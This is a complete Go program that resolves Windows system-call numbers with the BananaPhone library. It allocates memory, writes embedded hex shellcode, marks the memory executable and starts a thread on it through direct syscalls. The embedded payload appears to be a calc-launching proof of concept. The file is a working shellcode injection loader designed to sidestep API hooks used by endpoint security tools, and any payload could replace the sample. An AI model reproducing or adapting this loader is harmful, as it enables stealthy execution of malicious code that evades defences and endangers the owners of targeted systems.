package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
)

func setup() (uint16, uint16, uint16, uint16) {

	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if err != nil {
		log.Fatal(err)
	}
	createThreadId, err := bp.GetSysID("NtCreateThreadEx")
	if err != nil {
		log.Fatal(err)
	}
	protectVirtMemId, err := bp.GetSysID("NtProtectVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	writeVirtMem, err := bp.GetSysID("NtWriteVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	allocateVirtMem, err := bp.GetSysID("NtAllocateVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	return createThreadId, protectVirtMemId, writeVirtMem, allocateVirtMem
}

func inject(NtCreateThreadEx uint16, NtProtectVirtualMemory uint16, ntWriteVirtualMemory uint16, NtAllocateVirtualMemory uint16) {
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	handle := uintptr(0xffffffffffffffff) // -1 psuedo handle meaning current process
	var bAddr uintptr
	var regionSize = uintptr(len(shellcode))
	// Allocate Memory
	ret, err := bananaphone.Syscall(NtAllocateVirtualMemory,
		handle,
		uintptr(unsafe.Pointer(&bAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		log.Fatalf("[-] Failed to allocate memory. Return code is %x\n", ret)
		return
	}
	// Write Memory
	var numberOfBytesWritten uintptr
	ret, err = bananaphone.Syscall(ntWriteVirtualMemory,
		handle,
		bAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(regionSize),
		uintptr(unsafe.Pointer(&numberOfBytesWritten)),
		0,
	)

	if err != nil {
		log.Fatalf("[-] Failed to write memory. Return code is %x\n", ret)
	}

	var oldProtect uintptr
	// change protection to execute
	ret, err = bananaphone.Syscall(NtProtectVirtualMemory,
		handle,
		uintptr(unsafe.Pointer(&bAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		fmt.Printf("[-] Failed to protect Memory. Return code is %x\n", ret)
		return
	}
	// Call CreateThread
	var threadHandle uintptr
	ret, err = bananaphone.Syscall(NtCreateThreadEx,
		uintptr(unsafe.Pointer(&threadHandle)),
		0x1FFFFF, // all access
		0,
		handle,
		bAddr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)
	if err != nil {
		fmt.Printf("[-] Failed to create thread. Return code is %x\n", ret)
		return
	}
	// issues with ntClose
	ret, err = windows.WaitForSingleObject(windows.Handle(threadHandle), 0xffffffff)
	if err != nil {
		fmt.Printf("[-] Failed to wait for single object. Return code is %x\n", ret)
		return
	}
}

func main() {
	inject(setup())
}
